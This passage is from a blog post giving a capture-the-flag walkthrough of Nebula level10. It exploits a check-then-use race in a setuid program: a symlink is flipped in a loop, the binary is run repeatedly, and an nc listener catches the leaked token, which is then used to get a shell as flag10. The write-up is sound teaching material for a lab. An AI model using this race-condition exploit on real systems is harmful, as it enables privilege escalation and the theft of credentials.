read(ffd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      <span class="keyword">if</span>(rc == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to read from file: %s\n"</span>, strerror(errno));</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      write(fd, buffer, rc);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"wrote file!\n"</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"You don't have access to %s\n"</span>, file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The program sends the contents of a file via network. The problem is that the file is only opened if the real user id has access to it, which we do not have for the <code>token</code> file that is the obvious target. The actual file reading is done with <code>flag10</code> permissions. If one has experience with such code one can see that this is actually a race condition. What if the the check happens on an accessible file that is replaced by an inaccessible file (for <code>level10</code>) before it is actually read? We have our attack vector! But the file name is a constant argument, how can we change it during execution? The answer is we can’t but we can use symlinks such that the filename points to different files:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level10@nebula:/home/flag10$ <span class="built_in">echo</span> <span class="string">"dummy"</span> &gt; /tmp/dummy</span><br><span class="line">level10@nebula:/home/flag10$ <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> ln -sf ~flag10/token /tmp/switch; ln -sf /tmp/dummy /tmp/switch; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>As in most race conditions we will not be able to reliably trigger it, which is why we will try it multiple times:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> &#123;1..100&#125;; <span class="keyword">do</span> ./flag10 /tmp/switch 127.0.0.1; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>We also have to set up our listener on port <code>18211</code> as it is hard coded in the source code. Due to our numerous tries, the listener should keep listening after connection loss. <code>nc</code> has the <code>-k</code> flag for this purpose:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">level10@nebula:~$ nc -lk 18211</span><br><span class="line"></span><br><span class="line">.oO Oo.</span><br><span class="line">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span><br><span class="line">.oO Oo.</span><br><span class="line">dummy</span><br><span class="line">.oO Oo.</span><br><span class="line">dummy</span><br><span class="line">.oO Oo.</span><br><span class="line">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span><br><span class="line">[...]</span><br><span class="line">level10@nebula:/home/flag10$ su flag10</span><br><span class="line">Password:</span><br><span class="line">sh-4.2$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://erikgeiser.github.io/2017/03/15/nebula/" data-id="cjju038ba0000uzbqlzg95kqq" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Writeups/">CTF-Writeups</a></li></ul>

    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-Writeups/">CTF-Writeups</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF-Writeups/" style="font-size: 10px;">CTF-Writeups</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2017/12/17/necromancer/">Necromancer</a>
          </li>
        
          <li>
            <a href="/2017/03/15/nebula/">Nebula</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 Erik Geiser<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>